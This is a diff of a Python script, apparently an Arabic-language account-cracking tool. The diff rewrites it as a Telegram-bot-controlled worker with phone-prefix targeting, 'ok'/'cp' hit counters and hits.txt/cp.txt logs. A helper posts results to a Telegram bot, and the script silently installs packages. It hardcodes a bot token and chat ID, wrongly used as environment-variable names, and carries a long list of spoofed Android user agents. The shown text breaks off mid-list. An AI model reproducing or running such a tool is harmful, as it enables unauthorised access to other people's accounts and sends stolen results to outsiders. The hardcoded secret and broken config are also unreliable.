@@ -1,1410 +1,78 @@
-#تم فك تشغير من علش تخمط انت كواد وامك كواده وانت تلميذي
-# ------------------------------------------
-
-
-import webbrowser
-import webbrowser
-webbrowser.open('https://t.me/usgu2')
-import os,requests,sys,time,datetime
-now = datetime.datetime.today()
-an = datetime.datetime.now()
-an2 = datetime.datetime(2029,7,28)
-hours = (now.hour)
-if an > an2 or an == an2:
- print('\033[1;31mThe Date : '+ str(an))
- print('\033[1;31mThe Exp Date : '+ str(an2))
- time.sleep(1)
- clock_emoji = ['🕛', '🕐', '🕑', '🕒', '🕓', '🕔', '🕕', '🕖', '🕗', '🕘', '🕙', '🕚']
- exit(0)
-else: 
- print('𓏳'*60)
- print('\033[1;31m\nوقت الانتهاء : '+ str(an2))
- print('')
- print('𓏳'*60)
- print('\t\n\033[1;31m 𓆩  علش  🦅  ')
- print('\n\033[1;37m جـاࢪي تـشـغـيـل الاداة ♡شعندك انتضر😂 ......')
- DeKo = '''''''''''print('𓏳'50)'''''''''''
- 
- time.sleep(5)
- os.system('clear')
- pass
-print(('\x1b[38;5;48m—'*40)+'\n•  ¦  @CCCAAAIIIW •    \n'+('—'*40))
-
-import subprocess
 import sys
-def _():
- ___ = ['requests', 'bs4']
- for __ in ___:
-  try:
-   __import__(__)
-  except:
-   subprocess.check_call([sys.executable, '-m', 'pip', 'install', __], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-_()
-print('حقوق كرار جكاره')
-import time
-import requests
 import os
-import sys
-import json,hashlib
-import random,uuid
-from concurrent.futures import ThreadPoolExecutor as r
-from datetime import datetime
-import webbrowser
-from bs4 import BeautifulSoup
-from random import randint as rr
+import subprocess
+import time
+import random
+import uuid
+import json
+import asyncio
+import threading
+import requests
+from threading import Lock
 
-Z = '\033[1;31m'
-X = '\033[1;33m'
-Z1 = '\033[2;31m'
-F = '\033[2;32m'
-A = '\033[2;34m'
-C = '\033[2;35m'
-B = '\033[2;36m'
-Y = '\033[1;34m'
-W = "\033[1;37m"
-P1 = '\x1b[38;5;150m'
-P2 = '\x1b[38;5;190m'
-P  = '\x1b[1;97m'
-J22 = '\x1b[38;5;209m'
-C1  = '\x1b[38;5;120m'
-E = '\033[1;31m'
-W2 = '\x1b[38;5;120m'
-W3 = '\x1b[38;5;204m'
-W4 = '\x1b[38;5;150m'
-W5 = '\x1b[1;33m'
-W6 = '\x1b[1;31m'
-W7 = "\033[1;33m"
-W8 = '\x1b[38;5;117m'
-W9 = "\033[1m\033[34m"
-B = '\x1b[1;94m'
-O = '\x1b[1;96m'
-X = '\x1b[1;33m'
-G = '\033[2;32m'
-E = '\033[1;31m'
-W2 = '\x1b[38;5;120m'
-W3 = '\x1b[38;5;204m'
-W4 = '\x1b[38;5;150m'
-W5 = '\x1b[1;33m'
-W6 = '\x1b[1;31m'
-W7 = "\033[1;33m"
-W8 = '\x1b[38;5;117m'
-W9 = "\033[1m\033[34m"
-P = '\x1b[1;97m'
-B = '\x1b[1;94m'
-O = '\x1b[1;96m'
-Z = '\x1b[1;30m'
-X = '\x1b[1;33m'
-F = '\x1b[2;32m'
-L = '\x1b[1;95m'
-C = '\x1b[2;35m'
-A = '\x1b[2;39m'
-J = '\x1b[38;5;208m'
-J1 = '\x1b[38;5;202m'
-J2 = '\x1b[38;5;203m'
-J21 = '\x1b[38;5;204m'
-J22 = '\x1b[38;5;209m'
-F1 = '\x1b[38;5;76m'
-C1 = '\x1b[38;5;120m'
-P1 = '\x1b[38;5;150m'
-P2 = '\x1b[38;5;190m'
-T = '\x1b[38;5;231m'
+# ---- Dependency bootstrap ----
+try:
+    import requests
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    import requests
 
-def clear():
-    os.system('clear')
+try:
+    from telegram import Update
+    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
+    from telegram import Update
+    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-def noon():
-    print(f'{Z}='*55)
+# ---- Env config ----
+BOT_TOKEN = os.environ.get("6746587815:AAHBufzR0LXNq_n3bt6hlQU8k2c7ykLMD48")
+CHAT_ID = os.environ.get("5379040566")
+if not BOT_TOKEN or not CHAT_ID:
+    print("Set BOT_TOKEN and CHAT_ID env vars, boss man.")
+    sys.exit(1)
+CHAT_ID = int(CHAT_ID)
 
-logo=f'''
-──────────────────▒███✽─────────────────
-───────────────────▒█✽──────────────────
-──────────────────✽███──────────────────
-───────────────┼▒✽█▒─█▒✽▒┼──────────────
-───────────────▒███✽▒▒███▒──────────────
-───────█✽──▒█──███┼▒█▒┼██▒──█▒──▒█──────
-─────✽█▒█┼▒█▒█─▒███✽▒▒██▒▒─█▒█▒▒█▒█─────
-─────█▒█▒████▒▒─▒▒█▒─██▒▒─▒▒█▒████▒▒────
-─────✽█▒▒┼▒▒▒█┼───┼███────✽█▒▒┼┼▒▒█┼────
-──────✽█─▒▒▒█─────✽▒█▒✽────┼█┼█▒✽█──────
-──────▒█▒▒▒▒█✽────▒▒█▒▒────▒█▒▒▒▒█▒─────
-─────▒▒█▒▒▒▒██✽───┼▒█▒┼───▒█▒▒✽▒▒██▒────
-─────▒▒█▒████✽▒✽──▒▒██▒──▒▒▒█▒████▒▒────
-──────█▒█─▒█┼█▒█▒▒▒─✽─█▒▒█▒█┼█─▒█▒▒─────
-───────▒┼──✽▒✽█▒▒▒▒┼─▒▒▒▒▒█┼█───✽▒──────
-───✽▒█▒─────▒█▒▒─✽──▒─┼──▒▒█─────✽██▒───
-───▒███▒─────▒▒───▒▒▒▒✽✽─┼▒✽─────▒██▒┼──
-───┼███✽─────▒▒┼─█▒┼▒✽▒█─▒▒▒─────▒███───
-▒─✽██─██┼┼▒┼▒█▒┼▒▒▒▒▒▒▒▒▒┼▒█▒✽▒─✽█▒┼█▒✽✽
-█▒█▒✽▒✽██▒▒██─┼┼▒┼✽──┼✽▒▒─✽─█▒▒██▒✽▒▒▒█▒
-███┼▒█▒✽█████┼─▒▒▒▒─█─▒▒▒▒─✽█████┼▒█▒✽██
-█✽██▒▒✽██▒▒▒█┼▒─▒┼▒✽─✽✽✽▒─▒─█▒▒▒██✽▒▒██
-✽──▒█─█▒─┼▒┼▒█┼✽✽▒▒✽▒▒▒▒✽┼▒█▒┼▒──█▒┼█▒─┼
-───┼███✽─────▒▒┼✽█▒▒▒▒▒▒─▒▒▒─────▒███───
-───▒▒█▒▒─────▒✽───▒▒▒▒✽──┼▒▒─────▒██▒┼──
-────▒▒▒─────▒██▒┼✽──▒─┼✽─▒██▒────┼▒▒▒───
-───────▒✽──▒▒▒█▒▒▒▒✽─▒▒█▒██┼▒✽──▒▒──────
-─────┼█▒█┼▒█▒█✽█▒▒█─▒─█▒▒█┼█✽█─▒█▒█─────
-─────█▒█▒██▒█┼█┼──▒███▒──▒▒┼█▒██▒█▒▒────
-─────▒█▒▒✽✽▒▒█────✽▒█▒┼───✽█▒▒┼✽▒▒█✽────
-──────✽█✽█▒▒█─────▒▒█▒▒────✽█┼█▒▒█┼─────
-──────▒█✽▒▒▒█✽────✽██▒✽────▒█✽▒▒▒█┼─────
-─────▒██▒✽▒▒██✽───✽███────▒█▒▒✽▒▒▒█✽────
-─────█▒█▒████▒▒✽▒▒█▒─██▒▒┼▒▒█▒████▒▒────
-──────█▒█─▒█▒▒─▒██▒✽▒✽▒██▒─█▒█┼▒█▒█─────
-───────█┼──▒▒──███┼▒█▒✽██▒──▒✽──✽▒──────
-───────────────▒███▒✽▒██▒▒──────────────
-────────────────┼─▒▒▒█▒─✽───────────────
-──────────────────✽███┼─────────────────
-───────────────────▒█✽──────────────────
-'''
+# ---- Runtime state ----
+lock = Lock()
+state = {
+    "running": False,
+    "token": None,          # output forward token
+    "chat_id": None,        # output forward chat
+    "prefix": None,         # 0750 etc.
+    "seen": set(),
+    "ok": 0,
+    "cp": 0,
+    "loop": 0,
+    "attempts": 0,
+}
+stop_event = threading.Event()
+worker_thread = None
+HITS_FILE = "hits.txt"
+CP_FILE = "cp.txt"
 
-id_noon, ok_noon, loop_noon, cp_noon = [], 0, 0, 0
-aaa = ["a","b"]
+# ---- Telegram helpers ----
+def tg_send(text, chat=None, token=None):
+    chat = chat or CHAT_ID
+    token = token or BOT_TOKEN
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage",
+            data={"chat_id": chat, "text": text},
+            timeout=10,
+        )
+    except Exception:
+        pass
 
-Ahmad = [
-    
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/KTU84P)"
-
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/PPR1.910397.817)",
